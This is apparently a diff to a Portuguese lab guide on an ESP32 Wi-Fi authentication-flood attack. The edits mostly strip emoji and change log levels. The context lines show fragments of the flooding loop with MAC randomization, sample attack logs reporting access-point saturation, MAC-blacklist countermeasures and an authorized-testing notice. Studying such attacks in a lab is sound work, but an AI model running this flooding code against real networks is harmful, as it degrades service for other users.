@@ -73,7 +73,7 @@ static void auth_flood_task(void *pvParameters) {
         // Configurar e tentar conectar
         esp_wifi_set_config(WIFI_IF_STA, &wifi_config);
         
-        ESP_LOGI(TAG, "🔥 Tentativa #%d com MAC: " MACSTR, 
+        ESP_LOGI(TAG, " Tentativa #%d com MAC: " MACSTR, 
                  auth_attempts + 1, MAC2STR(random_mac));
         
         esp_err_t result = esp_wifi_connect();
@@ -90,7 +90,7 @@ static void auth_flood_task(void *pvParameters) {
         }
     }
     
-    ESP_LOGW(TAG, "✅ Auth flood concluído: %d tentativas", auth_attempts);
+    ESP_LOGI(TAG, " Auth flood concluído: %d tentativas", auth_attempts);
 }
 ```
 
@@ -103,7 +103,7 @@ static void wifi_event_handler(void* arg, esp_event_base_t event_base,
     switch (event_id) {
         case WIFI_EVENT_STA_START:
             attempt_start_time = xTaskGetTickCount() * portTICK_PERIOD_MS;
-            ESP_LOGD(TAG, "🔥 Tentativa de autenticação iniciada");
+            ESP_LOGD(TAG, " Tentativa de autenticação iniciada");
             break;
             
         case WIFI_EVENT_STA_DISCONNECTED: {
@@ -116,7 +116,7 @@ static void wifi_event_handler(void* arg, esp_event_base_t event_base,
             auth_failures++;
             update_response_time_stats(response_time);
             
-            ESP_LOGW(TAG, "❌ Falha #%d - Motivo: %d, Tempo: %dms", 
+            ESP_LOGI(TAG, " Falha #%d - Motivo: %d, Tempo: %dms", 
                      auth_attempts, event->reason, response_time);
             
             analyze_ap_behavior(event->reason, response_time);
@@ -126,7 +126,7 @@ static void wifi_event_handler(void* arg, esp_event_base_t event_base,
         case IP_EVENT_STA_GOT_IP:
             // Sucesso inesperado (senha estava correta?)
             auth_successes++;
-            ESP_LOGE(TAG, "⚠️ SUCESSO INESPERADO na tentativa #%d!", auth_attempts);
+            ESP_LOGE(TAG, " SUCESSO INESPERADO na tentativa #%d!", auth_attempts);
             break;
     }
 }
@@ -150,18 +150,18 @@ void analyze_ap_behavior(uint8_t reason_code, uint32_t response_time) {
             break;
             
         case WIFI_REASON_NO_AP_FOUND:
-            ESP_LOGW(TAG, "📡 AP não encontrado - possível sobrecarga");
+            ESP_LOGI(TAG, " AP não encontrado - possível sobrecarga");
             break;
     }
     
     // Detectar sinais de saturação
     if (consecutive_timeouts > 5) {
-        ESP_LOGW(TAG, "🚨 POSSÍVEL SATURAÇÃO: %d timeouts consecutivos", 
+        ESP_LOGI(TAG, " POSSÍVEL SATURAÇÃO: %d timeouts consecutivos", 
                  consecutive_timeouts);
     }
     
     if (response_time > (avg_normal_response * 3)) {
-        ESP_LOGW(TAG, "🐌 RESPOSTA LENTA: %dms (normal: %dms)", 
+        ESP_LOGI(TAG, "🐌 RESPOSTA LENTA: %dms (normal: %dms)", 
                  response_time, avg_normal_response);
     }
 }
@@ -243,45 +243,45 @@ idf.py -p /dev/ttyUSB0 monitor
 
 ### 1. Início do Ataque
 ```
-I (2000) AUTH_FLOOD: 🚨 INICIANDO AUTH FLOOD ATTACK! 🚨
-I (2010) AUTH_FLOOD: 🎯 Alvo: ESP32_AP
-I (2020) AUTH_FLOOD: ⚡ Intervalo: 200 ms
+I (2000) AUTH_FLOOD:  INICIANDO AUTH FLOOD ATTACK! 
+I (2010) AUTH_FLOOD:  Alvo: ESP32_AP
+I (2020) AUTH_FLOOD:  Intervalo: 200 ms
 I (2030) AUTH_FLOOD: 🔢 Máximo de tentativas: 1000
 I (2040) AUTH_FLOOD: 🎭 MAC randomizado: ATIVO
 ```
 
 ### 2. Execução das Tentativas
 ```
-I (3000) AUTH_FLOOD: 🔥 Tentativa #1 com MAC: aa:bb:cc:dd:ee:01
-W (3500) AUTH_FLOOD: ❌ Falha #1 - Motivo: 2, Tempo: 487ms
-I (3700) AUTH_FLOOD: 🔥 Tentativa #2 com MAC: aa:bb:cc:dd:ee:02
-W (4200) AUTH_FLOOD: ❌ Falha #2 - Motivo: 2, Tempo: 523ms
+I (3000) AUTH_FLOOD:  Tentativa #1 com MAC: aa:bb:cc:dd:ee:01
+W (3500) AUTH_FLOOD:  Falha #1 - Motivo: 2, Tempo: 487ms
+I (3700) AUTH_FLOOD:  Tentativa #2 com MAC: aa:bb:cc:dd:ee:02
+W (4200) AUTH_FLOOD:  Falha #2 - Motivo: 2, Tempo: 523ms
 ```
 
 ### 3. Detecção de Anomalias
 ```
-W (15000) AUTH_FLOOD: 🚨 POSSÍVEL SATURAÇÃO: 6 timeouts consecutivos
+W (15000) AUTH_FLOOD:  POSSÍVEL SATURAÇÃO: 6 timeouts consecutivos
 W (15010) AUTH_FLOOD: 🐌 RESPOSTA LENTA: 2847ms (normal: 500ms)
-W (15020) AUTH_FLOOD: 📊 Taxa de timeout atual: 75%
+W (15020) AUTH_FLOOD:  Taxa de timeout atual: 75%
 ```
 
 ### 4. Estatísticas de Progresso
 ```
-I (30000) AUTH_FLOOD: 📊 ESTATÍSTICAS AUTH FLOOD:
-I (30010) AUTH_FLOOD: ✅ Tentativas enviadas: 150
-I (30020) AUTH_FLOOD: ❌ Falhas: 149 (99.3%)
-I (30030) AUTH_FLOOD: ✅ Sucessos: 1 (0.7%)
-I (30040) AUTH_FLOOD: ⏱️ Tempo médio de resposta: 1247ms
-I (30050) AUTH_FLOOD: 🎯 Taxa de saturação: 45%
+I (30000) AUTH_FLOOD:  ESTATÍSTICAS AUTH FLOOD:
+I (30010) AUTH_FLOOD:  Tentativas enviadas: 150
+I (30020) AUTH_FLOOD:  Falhas: 149 (99.3%)
+I (30030) AUTH_FLOOD:  Sucessos: 1 (0.7%)
+I (30040) AUTH_FLOOD:  Tempo médio de resposta: 1247ms
+I (30050) AUTH_FLOOD:  Taxa de saturação: 45%
 ```
 
 ### 5. Análise Final
 ```
-W (60000) AUTH_FLOOD: ✅ ATAQUE AUTH FLOOD CONCLUÍDO!
-W (60010) AUTH_FLOOD: 📊 Total de tentativas: 1000
-W (60020) AUTH_FLOOD: ⏱️ Duração: 60 segundos
-W (60030) AUTH_FLOOD: 🎯 Impacto estimado no AP: ALTO
-W (60040) AUTH_FLOOD: 📈 Degradação de performance: 70%
+W (60000) AUTH_FLOOD:  ATAQUE AUTH FLOOD CONCLUÍDO!
+W (60010) AUTH_FLOOD:  Total de tentativas: 1000
+W (60020) AUTH_FLOOD:  Duração: 60 segundos
+W (60030) AUTH_FLOOD:  Impacto estimado no AP: ALTO
+W (60040) AUTH_FLOOD:  Degradação de performance: 70%
 ```
 
 ## Detecção e Contramedidas
@@ -353,7 +353,7 @@ typedef struct {
 void update_blacklist(uint8_t *mac, uint8_t reason) {
     if (is_flood_pattern(mac)) {
         blacklist_mac(mac, 3600);  // 1 hora
-        ESP_LOGW(TAG, "🚫 MAC blacklisted: " MACSTR, MAC2STR(mac));
+        ESP_LOGI(TAG, " MAC blacklisted: " MACSTR, MAC2STR(mac));
     }
 }
 ```
@@ -457,7 +457,7 @@ typedef struct {
 
 ## Uso Responsável
 
-⚠️ **IMPORTANTE**:
+ **IMPORTANTE**:
 - **Testes Autorizados**: Apenas em redes próprias ou com permissão
 - **Ambiente Controlado**: Isolado de redes de produção
 - **Documentação**: Registrar todos os testes e resultados
